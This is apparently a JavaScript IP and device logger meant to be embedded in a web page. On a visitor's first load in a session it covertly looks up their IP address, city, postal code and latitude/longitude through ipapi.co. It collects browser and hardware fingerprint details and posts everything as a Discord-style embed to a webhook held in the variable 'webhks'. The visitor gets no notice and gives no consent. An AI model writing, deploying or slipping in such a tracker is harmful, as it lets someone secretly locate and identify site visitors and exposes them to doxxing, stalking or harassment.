var webhks = webhks
if (!sessionStorage.getItem("Executed")) {
  sessionStorage.setItem("Executed", true);

  let logger = {};
  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => {
      let currentTime = getCurrentTime();
      let logger = {
        ipAddress: data.ip,
        city: data.city,
        region: data.region,
        countryCode: data.country_code,
        postalCode: data.postal,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone,
        windowProp: Object.keys(window).length,
        windowWidth: window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
        windowHeight: window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight,
        screenWidth: window.screen.availWidth,
        screenHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        orientation: getScreenOrientation(),
        orientationAngle: getScreenOrientationAngle(),
        os: navigator.platform,
        threads: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        languages: navigator.language,
        deviceType: getDeviceType(),
        flag: getCountryFlag(data.country_code),
        userAgent: navigator.userAgent,
        time: currentTime,
      };

      const payload = {
        embeds: [
          {
            title: "Information Data",
            description: `IP Address: ${logger.ipAddress}\nCity: ${logger.city}\nRegion: ${logger.region}\nCountry Code: ${logger.flag} ${logger.countryCode}\nPostal Code: ${logger.postalCode}\nLatitude: ${logger.latitude}\nLongitude: ${logger.longitude}\nTimezone: ${logger.timezone}\nWindow Properties: ${logger.windowProp}\nWindow Width: ${logger.windowWidth}\nWindow Height: ${logger.windowHeight}\nScreen Width: ${logger.screenWidth}\nScreen Height: ${logger.screenHeight}\nColor Depth: ${logger.colorDepth}\nOrientation: ${logger.orientation}\nOrientation Angle: ${logger.orientationAngle}\nPlatform: ${logger.os}\nThreads: ${logger.threads}\nMemory: ${logger.memory}\nLanguages: ${logger.languages}\nDevice Type: ${logger.deviceType}\nLocal Time: ${logger.time}\nUser Agent: ${logger.userAgent}`,
            image: {
              url: "https://s12.gifyu.com/images/Suv1N.gif",
            },
          },
        ],
      };

      fetch(webhks, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });
    });
}

function getScreenOrientation() {
  if (screen.orientation && screen.orientation.type) {
    return screen.orientation.type;
  } else if (window.orientation) {
    return getWindowOrientation();
  } else {
    return "Unknown";
  }
}

function getScreenOrientationAngle() {
  if (screen.orientation && screen.orientation.angle) {
    return screen.orientation.angle;
  } else if (window.orientation) {
    return getWindowOrientationAngle();
  } else {
    return 0;
  }
}

function getWindowOrientation() {
  switch (window.orientation) {
    case 0:
      return "Portrait";
    case 90:
      return "Landscape";
    case -90:
      return "Landscape (Reverse)";
    case 180:
      return "Portrait (Reverse)";
    default:
      return "Unknown";
  }
}

function getWindowOrientationAngle() {
  switch (window.orientation) {
    case 0:
      return 0;
    case 90:
      return 90;
    case -90:
      return -90;
    case 180:
      return 180;
    default:
      return 0;
  }
}

function getCountryFlag(countryCode) {
  const base = 127397;
  const countryCodeChars = countryCode.toUpperCase().split("");

  const flagEmoji = countryCodeChars
    .map((char) => String.fromCodePoint(base + char.charCodeAt(0)))
    .join("");

  return flagEmoji;
}

function getDeviceType() {
  if (navigator.maxTouchPoints && window.matchMedia("(any-pointer:coarse)").matches) {
    return "Mobile";
  } else {
    return "PC";
  }
}

function getCurrentTime() {
  const now = new Date();
  let hours = now.getHours();
  let minutes = now.getMinutes();
  let amPm = hours >= 12 ? "PM" : "AM";

  hours = hours % 12 || 12; // Convert to 12-hour format
  minutes = minutes < 10 ? "0" + minutes : minutes; // Add leading zero if minutes are less than 10

  return `${hours}:${minutes} ${amPm}`;
}
